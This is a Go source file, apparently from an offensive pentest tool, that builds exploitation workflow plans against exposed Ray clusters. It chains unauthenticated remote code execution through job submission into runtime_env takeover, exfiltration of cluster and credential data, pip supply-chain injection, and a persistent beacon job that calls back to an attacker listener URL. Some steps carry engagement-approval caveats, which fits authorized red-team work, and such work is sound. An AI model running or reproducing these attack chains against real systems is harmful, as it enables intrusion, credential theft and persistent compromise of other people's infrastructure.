package main

// buildRaySubmitWorkflowPlan chains a submitted Ray job (unauthenticated RCE on a
// worker) into log retrieval and the takeover / exfil / supply-chain follow-ons.
// The job id is threaded through so job-logs and runtime-env anchor on the real job.
func buildRaySubmitWorkflowPlan(target, jobID string) workflowPlan {
	target = canonicalServiceURL(target)
	base := "ray --target " + target + " "
	jobArg := ""
	if jobID != "" {
		jobArg = " --job-id " + shellSafeArg(jobID)
	}
	return workflowPlan{
		Target:      target,
		Stage:       "own",
		Landed:      "execution-confirmed",
		ChainSource: "ray-submit",
		Rationale:   "A job ran on a cluster worker (unauthenticated remote code execution); pull its output, then escalate to runtime takeover, cluster/credential exfil, and dependency injection.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample(base+"job-logs"+jobArg), "Pull the submitted job's stdout / log output.", false, 10),
			newWorkflowRecommendation(formatCommandExample(base+"runtime-env"+jobArg+" --force-exploit"), "Escalate to runtime_env takeover (dependency / working-dir control).", true, 20),
			newWorkflowRecommendation(formatCommandExample(base+"cluster-info --force-exploit"), "Exfiltrate cluster resource + environment data (cloud credential hints).", true, 30),
			newWorkflowRecommendation(formatCommandExample(base+"beacon --callback-url http://<your-listener>:8443/webhook --interval 30 --force-exploit"), "Submit a long-running beacon job to confirm a persistent Ray worker foothold.", true, 40),
			newWorkflowRecommendation(formatCommandExample(base+"pip-inject --package requests --force-exploit"), "Prove supply-chain injection via runtime_env pip.", true, 50),
		},
	}
}

func buildRayEnumWorkflowPlan(target string, jobsAPIReachable bool, jobIDs []string) workflowPlan {
	target = canonicalServiceURL(target)
	recommendations := []workflowRecommendation{}
	if jobsAPIReachable {
		recommendations = append(recommendations,
			newWorkflowRecommendation(formatCommandExample("ray --target "+target+" jobs"), "List visible Ray jobs now that the jobs API is reachable.", false, 10),
		)
	}
	if jobID := shellSafeArg(firstNonPlaceholder(jobIDs)); jobID != "" {
		recommendations = append(recommendations,
			newWorkflowRecommendation(formatCommandExample("ray --target "+target+" job-logs --job-id "+jobID), "Pull bounded job detail or logs for the discovered job.", false, 20),
			newWorkflowRecommendation(formatCommandExample("ray --target "+target+" job-artifacts --job-id "+jobID), "Check whether the discovered job exposes retrievable logs or artifacts.", false, 30),
		)
	}
	if jobsAPIReachable {
		recommendations = append(recommendations,
			newWorkflowRecommendation(formatCommandExample("ray --target "+target+" submit --payload-preset env-disclosure --force-exploit"), "Only after validating the dashboard surface and engagement approval.", true, 40),
		)
	}
	return workflowPlan{
		Target:          target,
		Stage:           "enum",
		Landed:          "reachable",
		ChainSource:     "ray-enum",
		Rationale:       "Ray should move from dashboard metadata into visible jobs, then bounded proof submission or runtime-env takeover checks if approved.",
		Recommendations: recommendations,
	}
}

func buildRayJobsSummaryWorkflowPlan(target string, jobIDs []string) workflowPlan {
	target = canonicalServiceURL(target)
	recommendations := []workflowRecommendation{}
	if jobID := shellSafeArg(firstNonPlaceholder(jobIDs)); jobID != "" {
		recommendations = append(recommendations,
			newWorkflowRecommendation(formatCommandExample("ray --target "+target+" job-logs --job-id "+jobID), "Pull bounded job detail or logs for the discovered job.", false, 10),
			newWorkflowRecommendation(formatCommandExample("ray --target "+target+" job-artifacts --job-id "+jobID), "Check whether the discovered job exposes retrievable logs or artifacts.", false, 20),
		)
	}
	recommendations = append(recommendations,
		newWorkflowRecommendation(formatCommandExample("ray --target "+target+" submit --payload-preset env-disclosure --force-exploit"), "Only after jobs API review confirms submission is in scope.", true, 40),
	)
	return workflowPlan{
		Target:          target,
		Stage:           "jobs",
		Landed:          "reachable",
		ChainSource:     "ray-jobs",
		Rationale:       "Job listing complete; inspect logs and artifacts, then bounded submission if approved.",
		Recommendations: recommendations,
	}
}

func buildRayJobWorkflowPlan(target, jobID string) workflowPlan {
	target = canonicalServiceURL(target)
	jobID = shellSafeArg(firstOrPlaceholder([]string{jobID}, "<job-id>"))
	return workflowPlan{
		Target:      target,
		Stage:       "correlation",
		Landed:      "reachable",
		ChainSource: "ray-jobs",
		Rationale:   "A visible Ray job ID helps anchor further jobs API review before any proof-job submission.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("ray --target "+target+" job-logs --job-id "+jobID), "Pull bounded logs or detail for this specific Ray job.", false, 10),
			newWorkflowRecommendation(formatCommandExample("ray --target "+target+" job-artifacts --job-id "+jobID), "Check whether this job exposes retrievable result or log artifacts.", false, 20),
			newWorkflowRecommendation(formatCommandExample("ray --target "+target+" submit --payload-preset env-disclosure --force-exploit"), "Only after jobs API review confirms submission is in scope.", true, 40),
		},
	}
}

func buildRayLogWorkflowPlan(target, jobID string) workflowPlan {
	target = canonicalServiceURL(target)
	jobID = shellSafeArg(firstOrPlaceholder([]string{jobID}, "<job-id>"))
	return workflowPlan{
		Target:      target,
		Stage:       "proof",
		Landed:      "read-confirmed",
		ChainSource: "ray-job-logs",
		Rationale:   "A confirmed job ID supports bounded log retrieval before any active submission proof.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("ray --target "+target+" job-artifacts --job-id "+jobID), "Pull any bounded artifacts or log references exposed by this job.", false, 10),
			newWorkflowRecommendation(formatCommandExample("ray --target "+target+" submit --payload-preset env-disclosure --force-exploit"), "Only after reviewing this job's detail and confirming active proof is appropriate.", true, 40),
			newWorkflowRecommendation(formatCommandExample("ray --target "+target+" runtime-env --job-id "+jobID+" --force-exploit"), "Only after logs suggest runtime_env or dependency loading is viable.", true, 50),
			newWorkflowRecommendation(formatCommandExample("ray --target "+target+" beacon --callback-url http://<your-listener>:8443/webhook --interval 30 --force-exploit"), "Only after execution is in scope: submit a long-running beacon job and confirm it with callback or running-job evidence.", true, 60),
		},
	}
}

func buildRayBeaconWorkflowPlan(target, jobID, stage, landed string) workflowPlan {
	target = canonicalServiceURL(target)
	jobID = shellSafeArg(firstOrPlaceholder([]string{jobID}, "<job-id>"))
	return workflowPlan{
		Target:      target,
		Stage:       stage,
		Landed:      landed,
		ChainSource: "ray-beacon",
		Rationale:   "A Ray persistence beacon was submitted; observe it through the Jobs API and keep the job ID anchored for later review.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("ray --target "+target+" job-logs --job-id "+jobID), "Read back beacon job detail/logs to confirm status and callback metadata.", false, 10),
			newWorkflowRecommendation(formatCommandExample("ray --target "+target+" jobs"), "List visible jobs to verify the beacon job remains present.", false, 20),
		},
	}
}
